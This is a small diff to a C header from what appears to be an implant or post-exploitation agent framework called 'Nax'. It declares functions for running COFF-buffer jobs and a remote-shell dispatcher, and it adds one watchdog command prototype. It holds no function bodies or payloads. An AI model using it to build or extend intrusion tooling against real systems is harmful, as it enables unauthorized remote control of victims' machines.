@@ -113,6 +113,7 @@ FUNC NAX_JOB*  NaxJobCreate( PNAX_INSTANCE Nax, UINT32 taskId, PBYTE coffBuf, UI
 FUNC INT       NaxJobStart( PNAX_INSTANCE Nax, NAX_JOB* job );
 FUNC INT       NaxJobList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
 FUNC INT       NaxJobKill( PNAX_INSTANCE Nax, UINT32 taskId );
+FUNC INT       NaxCmdWatchdogSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 
 /* ========= [ Commands/Shell.c - remote shell ] ========= */
 FUNC VOID    NaxShellDispatch( PNAX_INSTANCE Nax, UINT32 taskId, BYTE cmdId, const PBYTE args, UINT32 argsLen );
